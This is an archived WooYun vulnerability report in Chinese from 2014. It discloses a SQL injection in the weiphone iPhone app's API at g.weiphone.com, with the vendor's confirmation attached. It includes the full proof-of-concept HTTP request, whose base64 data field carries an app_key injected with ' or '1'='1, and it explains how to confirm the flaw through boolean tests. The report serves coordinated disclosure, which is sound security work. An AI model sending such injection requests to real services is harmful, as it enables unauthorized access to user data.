{"id": 5537, "wybug_id": "wooyun-2014-049665", "wybug_title": "weiphone网APP手机端接口存在注射漏洞", "wybug_corp": "weiphone", "wybug_author": "孤狐浪子", "wybug_date": "2014-01-23 16:47", "wybug_open_date": "2014-03-09 16:48", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-09：\t细节向公众公开  简要描述： 威锋网IPHONE端 APP应用接口存在注入，可能会导致用户信息受到威胁，望管理员速度修复,防止被他人恶意利用。 详细说明：  \nPOST /index.php?r=ApiOpen/GetGameInfoListCount HTTP/1.1Host: g.weiphone.comAccept-Encoding: gzipContent-Type: application/x-www-form-urlencoded; charset=utf-8Content-Length: 565Connection: closeUser-Agent:3.0.1 (iPhone; iPhone OS 7.0.4; zh_CN)data=eyJ2ZXJpZnkiOiJjMzM4MjgwZGM4MGQ3MmVmOWZiMmY1MjUwY2IzYzQ4ZCIsImFwcF9rZXkiOiI4NWQ2OGFlY2Q5YjRlYzFjZTExMDJjY2M2OWI2YmRiZDgyMDk3NzkwJyBvciAnNzU0Myc9Jzc1NDMiLCJlbmNyeXB0X2RhdGEiOiJRbGlJNUpPY3Z2ZVFTQStLdy95eXUxYnBnMytMekVaWHR2SXh0MjFsL0hpekZaM2l5enVPVnBkQkp1RDMzOWNYK3dPckdSU085U3lrTEVxci93L3JldDJ1Umk4eENJNlptWnJJM01ET0x4b0Q0Z2tUeHBzWlppVnZBaUgxQmQvT2RzOHFrK3lLM0g2QnpKNmN6K25Ca3BzOU9uUHM2VndrQ1JkbzVlQUcwMWFaWm1rTDBmczErSDRjaWNqSFdFeGFkOG9Ga3kvQ1hDb1Y4S1ErMHVUMURtTmRLLzBVV29uY1lPMHIxd0JKRWs2Qjdpdzl3LytCbDJKYXRxMXZUTzR6U1B4MmtZQnVjRkJ6ZnhvZHR0UzNleUp2a0JkK0JJWENKMnlyM2VBb3YzR1ZuUTZTeVZnWkN3PT0ifQ%3d%3d\ndata数据进行base64解码，得出\n{\"verify\":\"c338280dc80d72ef9fb2f5250cb3c48d\",\"app_key\":\"85d68aecd9b4ec1ce1102ccc69b6bdbd82097790' or '1'='1\",\"encrypt_data\":\"QliI5JOcvveQSA+Kw/yyu1bpg3+LzEZXtvIxt21l/HizFZ3iyzuOVpdBJuD339cX+wOrGRSO9SykLEqr/w/ret2uRi8xCI6ZmZrI3MDOLxoD4gkTxpsZZiVvAiH1Bd/Ods8qk+yK3H6BzJ6cz+nBkps9OnPs6VwkCRdo5eAG01aZZmkL0fs1+H4cicjHWExad8oFky/CXCoV8KQ+0uT1DmNdK/0UWoncYO0r1wBJEk6B7iw9w/+Bl2Jatq1vTO4zSPx2kYBucFBzfxodttS3eyJvkBd+BIXCJ2yr3eAov3GVnQ6SyVgZCw==\"}\napp_key参数可进行' or '1'='1 或' or '1'='2进行判断两次结果真假明显有区别。测试时在进行编码后提交。   漏洞证明：  \nPOST /index.php?r=ApiOpen/GetGameInfoListCount HTTP/1.1Host: g.weiphone.comAccept-Encoding: gzipContent-Type: application/x-www-form-urlencoded; charset=utf-8Content-Length: 565Connection: closeUser-Agent:3.0.1 (iPhone; iPhone OS 7.0.4; zh_CN)data=eyJ2ZXJpZnkiOiJjMzM4MjgwZGM4MGQ3MmVmOWZiMmY1MjUwY2IzYzQ4ZCIsImFwcF9rZXkiOiI4NWQ2OGFlY2Q5YjRlYzFjZTExMDJjY2M2OWI2YmRiZDgyMDk3NzkwJyBvciAnNzU0Myc9Jzc1NDMiLCJlbmNyeXB0X2RhdGEiOiJRbGlJNUpPY3Z2ZVFTQStLdy95eXUxYnBnMytMekVaWHR2SXh0MjFsL0hpekZaM2l5enVPVnBkQkp1RDMzOWNYK3dPckdSU085U3lrTEVxci93L3JldDJ1Umk4eENJNlptWnJJM01ET0x4b0Q0Z2tUeHBzWlppVnZBaUgxQmQvT2RzOHFrK3lLM0g2QnpKNmN6K25Ca3BzOU9uUHM2VndrQ1JkbzVlQUcwMWFaWm1rTDBmczErSDRjaWNqSFdFeGFkOG9Ga3kvQ1hDb1Y4S1ErMHVUMURtTmRLLzBVV29uY1lPMHIxd0JKRWs2Qjdpdzl3LytCbDJKYXRxMXZUTzR6U1B4MmtZQnVjRkJ6ZnhvZHR0UzNleUp2a0JkK0JJWENKMnlyM2VBb3YzR1ZuUTZTeVZnWkN3PT0ifQ%3d%3d\ndata数据进行base64解码，得出\n{\"verify\":\"c338280dc80d72ef9fb2f5250cb3c48d\",\"app_key\":\"85d68aecd9b4ec1ce1102ccc69b6bdbd82097790' or '1'='1\",\"encrypt_data\":\"QliI5JOcvveQSA+Kw/yyu1bpg3+LzEZXtvIxt21l/HizFZ3iyzuOVpdBJuD339cX+wOrGRSO9SykLEqr/w/ret2uRi8xCI6ZmZrI3MDOLxoD4gkTxpsZZiVvAiH1Bd/Ods8qk+yK3H6BzJ6cz+nBkps9OnPs6VwkCRdo5eAG01aZZmkL0fs1+H4cicjHWExad8oFky/CXCoV8KQ+0uT1DmNdK/0UWoncYO0r1wBJEk6B7iw9w/+Bl2Jatq1vTO4zSPx2kYBucFBzfxodttS3eyJvkBd+BIXCJ2yr3eAov3GVnQ6SyVgZCw==\"}\napp_key参数可进行' or '1'='1 或' or '1'='2进行判断两次结果真假明显有区别。测试时在进行编码后提交。由于需要多次编码提交，获取信息比较麻烦，请管理员检测存在注入漏洞的代码进行修复。   修复方案：  过滤！ 求礼物！^-^ 寻找BUG纯粹为了换乌云币，没有其它意图   版权声明：转载请注明来源 孤狐浪子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-01-23 16:58 厂商回复： 感谢提交，我们会尽快评估和解决。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}